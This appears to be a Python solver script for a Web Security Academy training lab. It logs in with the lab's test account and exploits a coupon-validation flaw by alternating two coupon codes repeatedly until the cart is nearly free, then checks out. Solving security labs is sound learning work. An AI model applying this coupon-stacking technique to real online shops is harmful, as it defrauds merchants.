from web_security_academy.core.utils import print_info, print_success, print_fail


def apply_coupon(session, coupon):
    csrf = session.get_csrf_token("/cart")
    data = {"csrf": csrf, "coupon": coupon}
    resp = session.post_path("/cart/coupon", data=data, allow_redirects=False)

    if resp.text != "Coupon applied":
        print_fail(f'Unable to apply coupon "{coupon}".')
    else:
        print_info(f'Applied coupon "{coupon}"\n')
        session.get_path(resp.headers["Location"])


def solve_lab(session):
    session.login("wiener", "peter")
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)
    print_info('Add a "Lightweight l33t leather jacket" to cart.\n')

    # When applying a coupon, the business logic only checks whether
    # the last coupon applied is the same as the current coupon.
    # Therefore, if I have two coupons, I can apply them one after
    # the other infinitely.

    for i in range(4):
        apply_coupon(session, "NEWCUST5")
        apply_coupon(session, "SIGNUP30")

    csrf = session.get_csrf_token("/cart", n=2)
    print_info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        print_fail("Unable to checkout.")
    else:
        print_success("Success!\n")
        session.get_path(resp.headers["Location"])
